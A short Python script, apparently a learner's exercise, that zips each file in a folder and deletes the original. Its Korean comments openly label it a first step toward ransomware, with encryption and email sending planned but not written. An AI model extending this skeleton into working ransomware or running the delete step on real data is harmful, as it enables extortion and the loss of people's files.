import os
import zipfile

my_dir = 'sesac1234'

print("hello")

for filename in os.listdir(my_dir):
    file_path = os.path.join(my_dir, filename)
    if (os.path.isfile(file_path)):
        print(filename)
        zip_filename=f"{file_path}.zip"

        with zipfile.ZipFile(zip_filename,'w') as zipf:
            zipf.write(file_path, arcname = filename)
            print(f"{filename}을 {zip_filename}으로 압축 완료함")
        os.remove(file_path)
        print(f"원본 파일 삭제")


# 랜섬웨어를 만들어보자 !
# zip으로 압축
# 암호화 기능
# 원본 파일 삭제
# 이메일 발송 